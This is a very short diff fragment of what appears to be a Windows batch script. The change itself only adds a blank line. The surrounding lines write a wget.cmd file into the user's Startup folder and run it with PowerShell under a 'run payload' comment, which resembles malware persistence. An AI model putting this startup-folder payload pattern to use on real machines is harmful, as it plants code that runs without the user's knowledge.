@@ -15,6 +15,7 @@ cd %STARTUP%
 
 ) > wget.cmd
 
+
 @REM run payload
 powershell ./wget.cmd
 
